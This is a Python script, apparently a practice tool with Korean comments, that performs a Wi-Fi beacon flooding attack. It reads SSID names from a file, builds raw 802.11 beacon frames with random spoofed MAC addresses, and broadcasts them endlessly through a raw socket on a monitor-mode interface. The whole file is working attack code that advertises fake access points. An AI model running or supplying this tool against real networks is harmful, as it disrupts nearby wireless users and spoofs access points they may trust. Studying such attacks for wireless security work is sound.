# -*- coding: utf-8 -*-
"""
Created on Wed Jan 11 16:17:32 2023

@author: kimse
syntax : beacon-flood <interface> <ssid-list-file>
sample : beacon-flood mon0 ssid-list.txt

비콘 플러딩 공격 원리 요약
- 이미 통신하고 있는 AP에게 무작위 MAC 주소를 설정한
  비콘 패킷을 빠르게 전달함으로서 MAC spoofing을 진행한다.
"""
# 참고링크 : https://lactea.kr/entry/python%EC%9D%84-%EC%9D%B4%EC%9A%A9%ED%95%9C-beacon-flooding-attack
#           https://stackoverflow.com/questions/39472943/python-broadcast-802-11-frames-using-the-socket-module

import sys, socket, struct, random, binascii

    
def setArgu(arg1, arg2):                #파이썬 인자를 처리하는 부분 
    interface   = arg1
    ssidList    = []        #fakeList
    
    with open(arg2, "r", encoding = "UTF-8") as f:
        while(True):
            tmp = f.readline()
            if(tmp == ''):
                break
            else:
                ssidList.append(tmp[:-1])
    return interface, ssidList
    
    
def setPacket(interface, ssidList):     #형식에 맞는 패킷 구조체를 만든다.
    pkt = []
    
    for i in ssidList:
        tmp = AttackPacket()
        tmp.setESSID(i)
        makePacket(tmp)
        pkt.append(loadPacket())
        del tmp
    
    return pkt
        
            
    

class AttackPacket:
    # packet structure
    # Radio_header + Beacon_frame + TimeStamp + Interval + Capacity + ESSID_tagNum + ESSID_len + ESSID + Other
    
    
    Radio_header = b""
    Beacon_frame = b""
    TimeStamp = b""
    Interval = b""
    Capacity = b"" # 2bytes
    ESSID_tagNum = b""
    ESSID_len = b""
    ESSID = b""
    Other = b""
    
    def __init__(self): 
        self.Radio_header = b"\x00\x00\x18\x00\x2e\x40\x00\xa0\x20\x08\x00\x00\x00\x02\x6c\x09\xa0\x00\xe1\x00\x00\x00\xcf\x00"
        self.Beacon_frame1 = b"\x80\x00\x00\x00\xff\xff\xff\xff\xff\xff"
        self.Beacon_frame2 = b"\xb0\xe1"
        self.randMAC = b""
        self.TimeStamp = b"\x82\x39\xaf\x29\x30\x00\x00\x00"
        self.Interval = b"\x64\x00"
        self.Capacity = 0x426
        self.ESSID_tagNum = b"\x00"
        self.Other = b"\x01\x08\x82\x84\x8B\x96\x0C\x12\x18\x24\x03\x01\x01\x05\x04\x01\x03\x00\x00\x2A\x01\x00\x32\x04\x30\x48\x60\x6C\x2D\x1A\x2C\x18\x1E\xFF\xFF\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x3D\x16\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xDD\x1A\x00\x50\xF2\x01\x01\x00\x00\x50\xF2\x02\x02\x00\x00\x50\xF2\x02\x00\x50\xF2\x04\x01\x00\x00\x50\xF2\x02\x30\x18\x01\x00\x00\x0F\xAC\x02\x02\x00\x00\x0F\xAC\x02\x00\x0F\xAC\x04\x01\x00\x00\x0F\xAC\x02\x00\x00\xDD\x18\x00\x50\xF2\x02\x01\x01\x00\x00\x03\xA4\x00\x00\x27\xA4\x00\x00\x42\x43\x5E\x00\x61\x32\x2F\x00\xDD\x1E\x00\x90\x4C\x33\x2C\x18\x1E\xFF\xFF\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xDD\x1A\x00\x90\x4C\x34\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xDD\x06\x00\xE0\x4C\x02\x01\x60"
    
    def setESSID(self, name):
        self.Capacity = struct.pack('<Q', 0x426 + len(bytes(name, 'utf-8')))[0:2]
        self.ESSID_len = struct.pack('B',len(bytes(name, 'utf-8')))
        self.ESSID = bytes(name, 'utf-8')
        self.randMAC = makeMAC()
    
def makePacket(AttackPkt):
    f = open("./packet.txt", "wb")
    f.write(AttackPkt.Radio_header)
    f.write(AttackPkt.Beacon_frame1)
    f.write(AttackPkt.randMAC)
    f.write(AttackPkt.randMAC)
    f.write(AttackPkt.Beacon_frame2)
    f.write(AttackPkt.TimeStamp)
    f.write(AttackPkt.Interval)
    f.write(AttackPkt.Capacity)
    f.write(AttackPkt.ESSID_tagNum)
    f.write(AttackPkt.ESSID_len)
    f.write(AttackPkt.ESSID)
    f.write(AttackPkt.Other)
    f.close()
    
def loadPacket():
    f = open("./packet.txt", "rb")
    pkt = f.read()
    f.close()
    return pkt

def makeMAC():
    mac = "b6a94f%02x%02x%02x" % (random.randint(0, 255),
                             random.randint(0, 255),
                             random.randint(0, 255))
    return binascii.unhexlify(mac)

interface, ssidList = setArgu(sys.argv[1], sys.argv[2])
pkt = setPacket(interface, ssidList)

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
s.bind((interface,0x0003))

while(True):
    for i in pkt:
        s.send(i)
        





